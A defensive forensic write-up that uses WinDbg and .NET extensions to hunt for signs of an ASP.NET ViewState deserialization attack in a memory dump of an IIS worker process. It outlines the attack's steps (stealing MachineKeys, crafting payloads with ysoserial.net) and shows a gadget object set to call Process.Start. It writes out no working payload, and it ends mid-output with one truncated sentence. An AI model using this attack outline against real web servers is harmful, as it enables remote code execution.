# Description

**TLDR:**
Thanks to @0xdf_ for providing this memory dump. This write-up is based on hunting artifacts from https://0xdf.gitlab.io/2024/06/08/htb-pov.html, but purely from a memory dump perspective.


The following WinDbg extensions are used during this write-up:

- **MEX:** https://www.microsoft.com/en-us/download/details.aspx?id=53304
- **SOSEX:** https://github.com/DebugPrivilege/Debugging/blob/main/Debugging%20Case%20Studies/Extensions/sosex.dll
- **NETIOEXT:** https://github.com/rodneyviana/netext/releases/tag/2.1.65.5000

The memory dump can be downloaded here: https://mega.nz/file/ftEE0RAS#KmoXnmXr3mRGADsrMtX56FwdDv1nAz36l7lvQuS6KB0

# How does ViewState works at a high-level?

ViewState is a mechanism used by ASP.NET web applications to maintain the state of web controls between postbacks. A postback occurs when a user interacts with a webpage, which causes the server to process the input and refresh the page with updated information.

Since HTTP is a stateless protocol, maintaining the state of web controls like text boxes and other form elements across these postbacks is important for providing a seamless user experience. ViewState addresses this need by storing the state information on the client side.

1. When a web page is sent to the client's browser, ASP.NET serializes the state of the page's controls into a Base64-encoded string. This string represents the state information that needs to be maintained. This is what we would call **serialization**.
2. The serialized state is stored in a hidden field within the HTML of the page, which is usually named **`__VIEWSTATE`**. This hidden field is included in the form data submitted back to the server during postbacks.
3. When receiving the postback request, the server extracts the **`__VIEWSTATE`** value from the form data and **deserializes** it to restore the state of the page's controls to their previous values.

# What is a ViewState Deserialization Attack?

A ViewState deserialization attack involes **ASP.NET** applications that exploits the way ViewState is handled during the **serialization** and **deserialization** process. The attack targets the mechanism that **ASP.NET** uses to maintain the state of web controls between postbacks by manipulating the **ViewState** to include malicious data, which can lead to **remote code execution**.

To successfully perform a **ViewState** deserialization attack, there are a couple of requirements:

1. The attacker needs to capture the HTTP traffic between the client and the server to intercept the ViewState data. This can be done with a tool like **Burpsuite** for example.
2. By default, ASP.NET protects the ViewState with a MAC to ensure its integrity. The MAC is a cryptographic hash that ensures the data has not been tampered with. An attacker needs to understand MAC protection because it is a primary defense mechanism against ViewState tampering.
3. An attacker would need to obtain the MachineKeys in order to craft a malicious **ViewState**. The keys used for MAC and encryption are stored in the **`web.config`** file.
4. Finally, the last step involves crafting a malicious payload using tools like **ysoserial.net**, re-encoding the **ViewState**, and sending it back to the server in a crafted HTTP request.

This is an example of how a malicious ViewState looks like:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/ddb59bee-4c0e-4331-bfab-e0c8e418338a)


It's not an unknown technique, but it's not the most popular one we often hear about. Mandiant reported for example that **APT41** has leveraged this technique in the past:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/4fbbcc3c-52d7-49e0-9cc1-3757677564aa)


# Why do we need a memory dump?

The IIS logs are insufficient to determine whether a ViewState deserialization attack has occurred because the POST requests do not contain ViewState data.

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/29e0daec-6166-4053-b429-f53512e209b7)



# WinDbg Walk Through - Analysis

Here we took a memory dump of the **w3wp.exe** process:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/25d87a1d-d0cc-4d16-9e0c-89f139022afc)



Once we have the memory dump, load it in WinDbg:

![image](https://github.com/DebugPrivilege/InsightEngineering/assets/63166600/79690b15-c6b7-4598-b0f0-2ab35242211f)


Let's start with the **`!mex.di`** command which stands for dump information. This command retrieves information about the machine from which the memory dump originated. It's especially handy when working with multiple memory dumps, as it helps distinguish the analysis related to each specific dump. This is an improved version of the **`vertarget`** command.

```
0:000> !mex.di
Computer Name: POV
User Name: POV$
PID: 0x12F8 = 0n4856
Windows 10 Version 17763 MP (2 procs) Free x64
Product: Server, suite: TerminalServer SingleUserTS
Edition build lab: 17763.1.amd64fre.rs5_release.180914-1434
Debug session time: Sun Jun  9 20:35:57.000 2024 (UTC + 1:00)
System Uptime: 0 days 0:08:29.103
Process Uptime: 0 days 0:07:25.000
  Kernel time: 0 days 0:00:00.000
  User time: 0 days 0:00:00.000
```

The **`!mex.p`** command will show us the current process with the associated PID, and so on.

```
0:000> !mex.p
Name     Ses PID           PEB              Mods Handle Thrd
======== === ============= ================ ==== ====== ====
w3wp.exe   0 12f8 (0n4856) 00000090f6789000  198    603   23

CommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "dev" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm0a901293-c23c-496e-8e63-240de398b772 -h "C:\inetpub\temp\apppools\dev\dev.config" -w "" -m 0 -t 20 -ta 0
Last event: 12f8.12fc: Break instruction exception - code 80000003 (first/second chance not available)

Show Threads: Unique Stacks    !listthreads (!lt)    ~*kv
```

The **NETEXT** extension enhances the debugging capabilities for applications that use the .NET framework. It provides a wide range of commands that allow us to inspect and manipulate various aspects of .NET applications during debugging sessions.

```
0:000> !netext.help
Commands for C:\Users\Admin\AppData\Local\Dbg\EngineExtensions\netext.dll:
  !help              - Displays information on available extension commands
  !regmatch          - Find and print lines matching the pattern
                       
                       Usage: !regmatch [-case] [-flavor (basic | extended |
                       ecmascript | awk | grep | egrep)] [-not] '<pattern>'
                       '<execute-pattern>' << <command-list>
                       Where:
                       	-case is the switch for case sensitiviness. If present
                       search is case sensitive (default is case insensitive)
                       	-flavor is the flavor of the T1 Regex. See
                       http://msdn.microsoft.com/en-us/library/bb982727.aspx
                       	<pattern> is the regex pattern. See examples here:
                       http://msdn.microsoft.com/en-us/library/ms972966.aspx
                       	Examples:
                       
                       Dump all stack object
                       	!regmatch -run '(^[0-9a-fA-F]+)\s+([0-9a-fA-F]+)\s'
                       "!do $2" << !dso
  !regsearch         - Find and print lines matching the pattern
                       
                       Usage: !regsearch [-case] [-flavor (basic | extended |
                       ecmascript | awk | grep | egrep)] [-not] <pattern>
                       <command-list>
                       Where:
                       	-case is the switch for case sensitiviness. If present
                       search is case sensitive (default is case insensitive)
                       	-flavor is the flavor of the T1 Regex. See
                       http://msdn.microsoft.com/en-us/library/bb982727.aspx
                       	<pattern> is the regex pattern. See examples here:
                       http://msdn.microsoft.com/en-us/library/ms972966.aspx
                       	Examples:
                       
                       Lists only stack objects containing httpcontext
                       	!regseach  httpcontext !dso
  !wapppool          - Display the Application Pool details
  !wclass            - Dump Class Layout. Use '!whelp wclass' for detailed help
  !wclrstack         - Dump current stack trace. Use !whelp wclrstack for more
                       help
  !wconcurrentdict   - Dump ConcurrentDictionary. Use '!whelp wconcurrentdict'
                       for detailed help
  !wconfig           - Dump Config file lines in memory. Use '!whelp wconfig'
                       for detailed help
  !wcookie           - Dump all cookies for all context, a single context or
                       matching a cookie filter criteria. Use '!whelp wcookie'
                       for detailed help
  !wdae              - Dump All Exceptions. Use '!whelp wdae' for detailed help
  !wdict             - Dump Dictionary. Use '!whelp wdict' for detailed help
  !wdo               - Dump object. Use '!whelp wdo' for detailed help
  !wdomain           - Dump Application Domains. Use '!whelp wdomain' for
                       detailed help
  !weval             - Evaluate ad-hoc commands separated by commas. Use
                       '!whelp weval' for detailed help
  !wfrom             - Dump object fields from Address, Stack or GAC. Use
                       '!whelp wfrom' for detailed help
  !wgchandle         - Dump GC Handles. Use '!whelp wgchandle' for detailed
                       help
  !whash             - Dump Hash Table. Use '!whelp whash' for detailed help
  !wheap             - Dump heap objects. Use '!whelp wheap' for detailed help
  !whelp             - Provide hyper-text help
  !whttp             - Dump HttpContext. Use '!whelp whttp' for detailed help
  !widnauls          - Command to list ULS position and tag and can be filtered
                       by message or category
  !windex            - Index and dump heap. Use '!whelp windex' for detailed
                       help
  !wk                - Dump current stack trace in mixed mode (native/managed).
                       Use !whelp wk for more help
  !wkeyvalue         - Dump NameObjectCollection types. Use '!whelp wkeyvalue'
                       for detailed help
  !wmakesource       - It tries to reflect the current frame into source code.
                       Use '!whelp wmakesource' for detailed help
  !wmodule           - Dump all modules in process which can be filtered by
                       name, company, debug mode, etc. Use '!whelp wmodule' for
                       detailed help
  !wopendownloadpage - Check latest version and open download page if there is
                       an update
  !wopensource       - Open the managed source code based on IP. Use '!whelp
                       wopensource' for detailed help
  !wp                - Step-out managed code (like F10 in Visual Studio)
  !wpe               - Dump Exception Object. Use '!whelp wpe' for detailed
                       help
  !wruntime          - Dump Http Runtime information as Active Requests and App
                       Domain Id
  !wselect           - Dump object fields from Address, Stack or GAC. Use
                       '!whelp wselect' for detailed help
  !wservice          - Dump WCF Services. Use '!whelp wservice' for detailed
                       help
  !wsetruntime       - Dump object. Use '!whelp wsetruntime' for detailed help
  !wsocket           - Dump a single socket or a summary of all sockets. Use
                       '!whelp wsocket' for detailed help
  !wsql              - Dump all sql commands, a single sql command or commands
                       matching a cookie filter criteria. Use '!whelp wsql' for
                       detailed help
  !wstack            - Dump stack objects. Use '!whelp wstack' for detailed
                       help
  !wt                - Step-into managed code (like F11 in Visual Studio)
  !wthreads          - Dump Managed Threads. Use '!whelp wthreads' for detailed
                       help
  !wtime             - Show UTC and local time. Use '!whelp wtime' for detailed
                       help
  !wtoken            - Dump all security tokens or matching a token filter
                       criteria. Use '!whelp wtoken' for detailed help
  !wupdate           - Try to open download page in default browser
  !wvar              - Dump Environment Variables. Use '!whelp wvar' for
                       detailed help
  !wver              - Load .NET and display its version
  !wxml              - Dump XML Document or XML Node. Use '!whelp wkeyvalue'
                       for detailed help
!help <cmd> will give more information for a particular command
```

The output from the **`!netext.wapppool`** command provides detailed information about an IIS Application Pool. This specifies the name of the Application Pool.

```
0:000> !netext.wapppool
AppPool Name         : dev
AppPool .NET Version : v4.0
IIS Version          : 10.0.1.17763
Full Command Line    : c:\windows\system32\inetsrv\w3wp.exe -ap "dev" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm0a901293-c23c-496e-8e63-240de398b772 -h "C:\inetpub\temp\apppools\dev\dev.config" -w "" -m 0 -t 20 -ta 0
Process Account      : WORKGROUP\POV$
Machine Name         : POV
Domain Name          : WORKGROUP
```

The output of the **`!netext.wfrom`** command provides information about various HTTP requests being processed. **`!netext.wfrom`** allows us to query and display data from .NET objects in memory. By selecting specific fields and formatting them, it provides a clear overview of key request attributes such as the URL, method, status code, timestamp, and execution thread.

```
0:000> !netext.wfrom -nospace -nofield -type *.HttpContext select $rpad($addr(),10), " ", $if(!_thread, " --", $lpad($thread(_thread.DONT_USE_InternalThread),4)), " ", $tickstodatetime(_utcTimestamp.dateData), " ", $if((_timeoutSet==1),$tickstotimespan(_timeout._ticks), "Not set "), " ", $if(_response._completed || _finishPipelineRequestCalled,"Finished", $tickstotimespan($now()-_utcTimestamp.dateData)), " ", $replace($lpad(_response._statusCode,8), "0n","")," ", $rpad($isnull(_request._httpMethod,"NA"),8), " ", $isnull(_request._url.m_String, _request._filePath._virtualPath)
0000020DA7066288  -- 6/9/2024 7:28:33 PM 00:00:00 Finished    302 GET      /
0000020DA707B688  -- 6/9/2024 7:28:33 PM 00:00:00 Finished    200 GET      /portfolio/
0000020DA70834C0  -- 6/9/2024 7:28:33 PM 00:00:00 Finished    200 GET      /portfolio/default.aspx
0000020DA7417B88  -- 6/9/2024 7:29:02 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA74182E0  -- 6/9/2024 7:28:39 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA741BFA8  -- 6/9/2024 7:28:39 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA7431C68  -- 6/9/2024 7:28:55 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA7435768  -- 6/9/2024 7:29:02 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020DA7449EF8  -- 6/9/2024 7:29:14 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA744D0A0  -- 6/9/2024 7:29:14 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA7465CE8  -- 6/9/2024 7:29:26 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA746D8A0  -- 6/9/2024 7:29:26 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA7482178  -- 6/9/2024 7:29:50 PM 00:00:00 Finished    200 GET      /portfolio/contact.aspx
0000020DA7496C60  -- 6/9/2024 7:30:08 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA749A6D8  -- 6/9/2024 7:30:08 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74B63E0  -- 6/9/2024 7:30:40 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA74BA870  -- 6/9/2024 7:30:40 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74D2F70  -- 6/9/2024 7:31:13 PM 00:00:00 Finished    200 POST     /portfolio/
0000020DA74D6168  -- 6/9/2024 7:31:13 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6E37760  -- 6/9/2024 7:28:33 PM 00:00:00 00:07:23    200 NA       /
0000020EA6E79750  -- 6/9/2024 7:28:55 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6EAB088  -- 6/9/2024 7:29:18 PM 00:00:00 Finished    200 POST     /portfolio/
0000020EA6EB2A98  -- 6/9/2024 7:29:18 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EC0138  -- 6/9/2024 7:30:16 PM 00:00:00 Finished    200 POST     /portfolio/
0000020EA6EC32E0  -- 6/9/2024 7:30:16 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6ED47B0  -- 6/9/2024 7:30:54 PM 00:00:00 Finished    200 POST     /portfolio/
0000020EA6ED8160  -- 6/9/2024 7:30:54 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EE9D80  -- 6/9/2024 7:31:49 PM 00:00:00 Finished    200 POST     /portfolio/
0000020EA6EF18F0  -- 6/9/2024 7:31:49 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
```

To analyze the **POST** requests related to a ViewState attack, let's focus on **POST** requests made to pages, such as **default.aspx** that handle ViewState data. To reduce the amount of results in our console, we are going to use **`!mex.grep`** to filter on POST requests made to the **default.aspx** pages.

```
0:000> !mex.grep -r /portfolio/default.aspx !netext.wfrom -nospace -nofield -type *.HttpContext select $rpad($addr(),10), " ", $if(!_thread, " --", $lpad($thread(_thread.DONT_USE_InternalThread),4)), " ", $tickstodatetime(_utcTimestamp.dateData), " ", $if((_timeoutSet==1),$tickstotimespan(_timeout._ticks), "Not set "), " ", $if(_response._completed || _finishPipelineRequestCalled,"Finished", $tickstotimespan($now()-_utcTimestamp.dateData)), " ", $replace($lpad(_response._statusCode,8), "0n","")," ", $rpad($isnull(_request._httpMethod,"NA"),8), " ", $isnull(_request._url.m_String, _request._filePath._virtualPath)
0000020DA70834C0  -- 6/9/2024 7:28:33 PM 00:00:00 Finished    200 GET      /portfolio/default.aspx
0000020DA741BFA8  -- 6/9/2024 7:28:39 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA7435768  -- 6/9/2024 7:29:02 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020DA744D0A0  -- 6/9/2024 7:29:14 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA746D8A0  -- 6/9/2024 7:29:26 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA749A6D8  -- 6/9/2024 7:30:08 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74BA870  -- 6/9/2024 7:30:40 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020DA74D6168  -- 6/9/2024 7:31:13 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6E79750  -- 6/9/2024 7:28:55 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
0000020EA6EB2A98  -- 6/9/2024 7:29:18 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EC32E0  -- 6/9/2024 7:30:16 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6ED8160  -- 6/9/2024 7:30:54 PM 00:00:00 Finished    200 POST     /portfolio/default.aspx
0000020EA6EF18F0  -- 6/9/2024 7:31:49 PM 00:00:00 Finished    302 POST     /portfolio/default.aspx
```

The **`!Mex.DisplayObj`** command displays the properties and state of a specific **`System.Web.HttpContext`** object at the memory address **`0000020DA741BFA8`**. This command is inspecting the internal state of an ASP.NET HTTP context object and shows various fields that we can inspect further.

```
0:000> !mex.DisplayObj 0000020DA741BFA8
0x0000020da741bfa8 System.Web.HttpContext
[statics]
  0000  _asyncAppHandler                                          : NULL
  0008  _appInstance                                              : NULL
  0010  _handler                                                  : NULL
  0018  _request                                                  : 0000020da741c168 (System.Web.HttpRequest)
  0020  _response                                                 : 0000020da741c2f0 (System.Web.HttpResponse)
  0028  _server                                                   : NULL
  0030  _traceContextStack                                        : NULL
  0038  _topTraceContext                                          : NULL
  0040  _items                                                    : NULL
  0048  _errors                                                   : NULL
  0050  _tempError                                                : NULL
  0058  _principalContainer                                       : 0000020da741c4c8 (System.Web.RootedObjects)
  0060  _Profile                                                  : NULL
  0068  _wr                                                       : 0000020da741bc68 (System.Web.Hosting.IIS7WorkerRequest)
  0070  _configurationPath                                        : NULL
  0078  _dynamicCulture                                           : 0000020da6ea5450 (System.Globalization.CultureInfo)
  0080  _dynamicUICulture                                         : 0000020da6ea5450 (System.Globalization.CultureInfo)
  0088  _handlerStack                                             : NULL
  0090  _pageInstrumentationService                               : NULL
  0098  _webSocketRequestedProtocols                              : NULL
  00a0  _timeoutCancellationTokenHelper                           : 0000020da707b130 (System.Web.Util.CancellationTokenHelper)
  00a8  _timeoutLink                                              : NULL
  00b0  _thread                                                   : NULL
  00b8  _configurationPathData                                    : NULL
  00c0  _filePathData                                             : 0000020da708af20 (System.Web.CachedPathData)
  00c8  _sqlDependencyCookie                                      : NULL
  00d0  _sessionStateModule                                       : NULL
  00d8  _templateControl                                          : NULL
  00e0  _notificationContext                                      : NULL
  00e8  IndicateCompletionContext                                 : NULL
  00f0  ThreadInsideIndicateCompletion                            : NULL
  00f8  ThreadContextId                                           : 0000020da741c150 (System.Object)
  0100  _syncContext                                              : NULL
  0108  _threadWhichStartedWebSocketTransition                    : NULL
  0110  _webSocketNegotiatedProtocol                              : NULL
  0118  _remapHandler                                             : NULL
  0120  _currentHandler                                           : NULL
  0128  <System.Web.IPrincipalContainer.Principal>k__BackingField : NULL
  0130  _rootedObjects                                            : 0000020da741c4c8 (System.Web.RootedObjects)
  0138  _CookielessHelper                                         : 0000020da741c448 (System.Web.Security.CookielessHelperClass)
  0140  _timeoutStartTimeUtcTicks                                 : 638535581194279581 (System.Int64)
  0148  _timeoutTicks                                             : 1100000000 (System.Int64)
  0150  _rootedPtr                                                : 0000000000000000 (System.IntPtr)
  0158  _asyncPreloadModeFlags                                    : None (0) (System.Web.Configuration.AsyncPreloadModeFlags)
  015c  _serverExecuteDepth                                       : 0 (System.Int32)
  0160  _timeoutState                                             : 0 (System.Int32)
  0164  <SessionStateBehavior>k__BackingField                     : Default (0) (System.Web.SessionState.SessionStateBehavior)
  0168  _asyncPreloadModeFlagsSet                                 : True (System.Boolean)
  0169  _errorCleared                                             : False (System.Boolean)
  016a  _skipAuthorization                                        : False (System.Boolean)
  016b  _preventPostback                                          : False (System.Boolean)
  016c  _runtimeErrorReported                                     : False (System.Boolean)
  016d  _threadAbortOnTimeout                                     : True (System.Boolean)
  016e  _delayedSessionState                                      : False (System.Boolean)
  016f  _isAppInitialized                                         : True (System.Boolean)
  0170  _isIntegratedPipeline                                     : True (System.Boolean)
  0171  _finishPipelineRequestCalled                              : True (System.Boolean)
  0172  _impersonationEnabled                                     : False (System.Boolean)
  0173  HideRequestResponse                                       : False (System.Boolean)
  0174  InIndicateCompletion                                      : False (System.Boolean)
  0175  _webSocketTransitionState                                 : Inactive (0) (System.Web.WebSocketTransitionState)
  0176  <FirstRequest>k__BackingField                             : False (System.Boolean)
  0177  _requiresSessionStateFromHandler                          : True (System.Boolean)
  0178  _readOnlySessionStateFromHandler                          : False (System.Boolean)
  0179  InAspCompatMode                                           : False (System.Boolean)
  017a  <DisableCustomHttpEncoder>k__BackingField                 : False (System.Boolean)
  017b  _ProfileDelayLoad                                         : True (System.Boolean)
  0180  _utcTimestamp                                             : 0000020da741c130 6/9/2024 7:28:39 PM (System.DateTime)
  0188  _requestCompletedQueue                                    : 0000020da741c138 (System.Web.Util.SubscriptionQueue<System.Action<System.Web.HttpContext>>)
  0190  _pipelineCompletedQueue                                   : 0000020da741c140 (System.Web.Util.SubscriptionQueue<System.IDisposable>)
```

**`System.Web.HttpRequest`** is a class in .NET that provides access to the **HTTP request** data from the client to the server. This class is part of the System.Web namespace and is used primarily in ASP.NET applications to handle incoming HTTP requests. This output includes information about the HTTP method, path, query string, content type, form data, encoding, content length, and other properties related to the HTTP request.

```
0:000> !mex.DisplayObj 0x0000020da741c168
0x0000020da741c168 System.Web.HttpRequest
[statics]
  0000  _wr                          : 0000020da741bc68 (System.Web.Hosting.IIS7WorkerRequest)
  0008  _context                     : 0000020da741bfa8 (System.Web.HttpContext)
  0010  _httpMethod                  : 0000020da741be88  "POST" [4] (System.String)
  0018  _requestType                 : NULL
  0020  _path                        : 0000020da741d398 (System.Web.VirtualPath)
  0028  _rewrittenUrl                : NULL
  0030  _filePath                    : 0000020da741c8e8 (System.Web.VirtualPath)
  0038  _currentExecutionFilePath    : NULL
  0040  _pathInfo                    : NULL
  0048  _queryStringText             : 0000020da6d71420  "" [0] (System.String)
  0050  _queryStringBytes            : NULL
  0058  _pathTranslated              : 0000020da741be10  "C:\inetpub\wwwroot\dev\portfolio\default..." [45] (System.String)
  0060  _contentType                 : 0000020da7082c28  "application/x-www-form-urlencoded" [33] (System.String)
  0068  _clientTarget                : NULL
  0070  _acceptTypes                 : NULL
  0078  _userLanguages               : NULL
  0080  _browsercaps                 : 0000020da73ed578 (System.Web.Mobile.MobileCapabilities)
  0088  _url                         : NULL
  0090  _referrer                    : NULL
  0098  _inputStream                 : NULL
  00a0  _clientCertificate           : NULL
  00a8  _tlsTokenBindingInfo         : NULL
  00b0  _logonUserIdentity           : NULL
  00b8  _requestContext              : NULL
  00c0  _rawUrl                      : 0000020da741c470  "/portfolio/" [11] (System.String)
  00c8  _readEntityBodyStream        : NULL
  00d0  _unvalidatedRequestValues    : 0000020da74229c0 (System.Web.UnvalidatedRequestValues)
  00d8  _params                      : NULL
  00e0  _queryString                 : NULL
  00e8  _form                        : 0000020da7420e60 (System.Web.HttpValueCollection)
  00f0  _headers                     : NULL
  00f8  _serverVariables             : NULL
  0100  _cookies                     : NULL
  0108  _storedResponseCookies       : NULL
  0110  _files                       : NULL
  0118  _rawContent                  : 0000020da7420fe8 (System.Web.HttpRawUploadedContent)
  0120  _multipartContentElements    : NULL
  0128  _encoding                    : 0000020da6f00cf8 (System.Text.UTF8Encoding)
  0130  _filterSource                : NULL
  0138  _installedFilter             : NULL
  0140  _anonymousId                 : NULL
  0148  _clientFilePath              : 0000020da741c4a0 (System.Web.VirtualPath)
  0150  _clientBaseDir               : NULL
  0158  _httpVerb                    : POST (5) (System.Web.HttpVerb)
  015c  _contentLength               : 361 (System.Int32)
  0160  _readEntityBodyMode          : Classic (1) (System.Web.ReadEntityBodyMode)
  0164  _computePathInfo             : False (System.Boolean)
  0165  _queryStringOverriden        : False (System.Boolean)
  0166  _tlsTokenBindingInfoResolved : False (System.Boolean)
  0167  _needToInsertEntityBody      : True (System.Boolean)
  0168  _filterApplied               : False (System.Boolean)
  0170  _flags                       : 0000020da741c2e0 (System.Web.Util.SimpleBitVector32)
```

The **`_form`** field in the **`System.Web.HttpRequest`** object represents the form data that was submitted with the HTTP request. This field is of type **`System.Web.HttpValueCollection`**, which is used to store key-value pairs of form data. The **`__VIEWSTATE`** field contains the serialized state information encoded in a string. The output we're seeing here is an interaction of downloading a file named **cv.pdf** from the server.

```
0:000> !mex.DisplayObj 0x0000020da7420e60
[raw] 0000020da7420e60 System.Web.HttpValueCollection Entries: 6
Name                 Value
==================== ========================================================================================================================================
__EVENTTARGET        download
__EVENTARGUMENT      
__VIEWSTATE          WDz1HpKP80PLhBqbPJQMHQxU+NbkhfdeQrpvGeHirzFgEb4JdmawZMAMVWDNhjDXNER2+pUJ3/zzYp8Dorzz/M8Q6sc=
__VIEWSTATEGENERATOR 8E0F0FA3
__EVENTVALIDATION    PJQCREUo0khpECgXqIUAKspvizBGfLAW/qc5I85PBkb2p8lQwzO8DDS/4HqGblZJ3xC7USh9PyfG9mTKhe4E9qWnaXtQSDSBEp/g4KFMytV0fuiutV4uWhUIRpipDsIPUVUBqw==
file                 cv.pdf
```

The **`_rawContent`** field in the **`System.Web.HttpRequest`** object holds the raw binary data of uploaded content in an HTTP request. It has a byte array **`_data`** of length 361 bytes, which stores the uploaded data in memory. 

```
0:000> !mex.DisplayObj 0x0000020da7420fe8
0x0000020da7420fe8 System.Web.HttpRawUploadedContent
  0000  _data           : 0000020da7421020 (System.Byte[]) [Length: 361]
  0008  _file           : NULL
  0010  _fileThreshold  : 81920 (System.Int32)
  0014  _expectedLength : 361 (System.Int32)
  0018  _length         : 361 (System.Int32)
  001c  _chunkOffset    : 0 (System.Int32)
  0020  _chunkLength    : 0 (System.Int32)
  0024  _completed      : True (System.Boolean)
```

The content of the **`System.Byte[]`** array is displayed in a hexadecimal and ASCII representation. The raw byte array represents URL-encoded form data. It shows the form fields and values that were submitted in the POST request, which we

```
0:000> !mex.DisplayObj 0x0000020da7421020
[raw] 0000020da7421020 System.Byte[] Length: 361
00000000   5F 5F 45 56 45 4E 54 54 41 52 47 45  54 3D 64 6F 77 6E 6C 6F 61 64 26 5F    __EVENTTARGE T=download&_
00000018   5F 45 56 45 4E 54 41 52 47 55 4D 45  4E 54 3D 26 5F 5F 56 49 45 57 53 54    _EVENTARGUME NT=&__VIEWST
00000030   41 54 45 3D 57 44 7A 31 48 70 4B 50  38 30 50 4C 68 42 71 62 50 4A 51 4D    ATE=WDz1HpKP 80PLhBqbPJQM
00000048   48 51 78 55 25 32 42 4E 62 6B 68 66  64 65 51 72 70 76 47 65 48 69 72 7A    HQxU%2BNbkhf deQrpvGeHirz
00000060   46 67 45 62 34 4A 64 6D 61 77 5A 4D  41 4D 56 57 44 4E 68 6A 44 58 4E 45    FgEb4JdmawZM AMVWDNhjDXNE
00000078   52 32 25 32 42 70 55 4A 33 25 32 46  7A 7A 59 70 38 44 6F 72 7A 7A 25 32    R2%2BpUJ3%2F zzYp8Dorzz%2
00000090   46 4D 38 51 36 73 63 25 33 44 26 5F  5F 56 49 45 57 53 54 41 54 45 47 45    FM8Q6sc%3D&_ _VIEWSTATEGE
000000A8   4E 45 52 41 54 4F 52 3D 38 45 30 46  30 46 41 33 26 5F 5F 45 56 45 4E 54    NERATOR=8E0F 0FA3&__EVENT
000000C0   56 41 4C 49 44 41 54 49 4F 4E 3D 50  4A 51 43 52 45 55 6F 30 6B 68 70 45    VALIDATION=P JQCREUo0khpE
000000D8   43 67 58 71 49 55 41 4B 73 70 76 69  7A 42 47 66 4C 41 57 25 32 46 71 63    CgXqIUAKspvi zBGfLAW%2Fqc
000000F0   35 49 38 35 50 42 6B 62 32 70 38 6C  51 77 7A 4F 38 44 44 53 25 32 46 34    5I85PBkb2p8l QwzO8DDS%2F4
00000108   48 71 47 62 6C 5A 4A 33 78 43 37 55  53 68 39 50 79 66 47 39 6D 54 4B 68    HqGblZJ3xC7U Sh9PyfG9mTKh
00000120   65 34 45 39 71 57 6E 61 58 74 51 53  44 53 42 45 70 25 32 46 67 34 4B 46    e4E9qWnaXtQS DSBEp%2Fg4KF
00000138   4D 79 74 56 30 66 75 69 75 74 56 34  75 57 68 55 49 52 70 69 70 44 73 49    MytV0fuiutV4 uWhUIRpipDsI
00000150   50 55 56 55 42 71 77 25 33 44 25 33  44 26 66 69 6C 65 3D 63 76 2E 70 64    PUVUBqw%3D%3 D&file=cv.pd
00000168   66                                                                         f
```

The output here shows details of two **`System.Windows.Data.ObjectDataProvider`** objects in memory. **`System.Windows.Data.ObjectDataProvider`** is a class that allows you to create and bind to an object, or call a method of an object, in **XAML**. If **`ObjectDataProvider`** is configured to call methods like **`System.Diagnostics.Process.Start`** and an attacker can influence the parameters passed to these methods, it could lead to a remote code execution.

The **`_objectInstance`** field is used to store the instance of the object that has been created or provided for use by the **`ObjectDataProvider`**. This instance is what the **`ObjectDataProvider`** interacts with to retrieve data or execute methods.

```
0:000> !ForEachObject -s -x "!do2 @#Obj" System.Windows.Data.ObjectDataProvider
0x0000020da7571c30 System.Windows.Data.ObjectDataProvider
  0000  DataChanged               : NULL
  0008  PropertyChanged           : NULL
  0010  _data                     : True (System.Boolean)
  0018  _error                    : NULL
  0020  _dispatcher               : 0000020da74fdc08 (System.Windows.Threading.Dispatcher)
  0028  _deferLevel               : 0 (System.Int32)
  002c  _isInitialLoadEnabled     : False (System.Boolean)
  002d  _initialLoadCalled        : True (System.Boolean)
  002e  _isAsynchronous           : False (System.Boolean)
  002f  _needNewInstance          : True (System.Boolean)
  0030  _objectType               : 0000020da75743d0 System.Diagnostics.Process (System.RuntimeType)
  0038  _objectInstance           : 0000020da757b090 (System.Diagnostics.Process)
  0040  _methodName               : 0000020da7563198  "Start" [5] (System.String)
  0048  _instanceProvider         : NULL
  0050  _constructorParameters    : 0000020da7571cf0 (MS.Internal.Data.ParameterCollection)
  0058  _methodParameters         : 0000020da7571d88 (MS.Internal.Data.ParameterCollection)
  0060  _sourceDataChangedHandler : 0000020da7571de0 (System.EventHandler)
  0068  _mode                     : FromInstance (2) (System.Windows.Data.ObjectDataProvider+SourceMode)
--------------------------------------------------------------------------------
0x0000020ea6f21410 System.Windows.Data.ObjectDataProvider
  0000  DataChanged               : NULL
  0008  PropertyChanged           : NULL
  0010  _data                     : True (System.Boolean)
  0018  _error                    : NULL
  0020  _dispatcher               : 0000020ea6f21490 (System.Windows.Threading.Dispatcher)
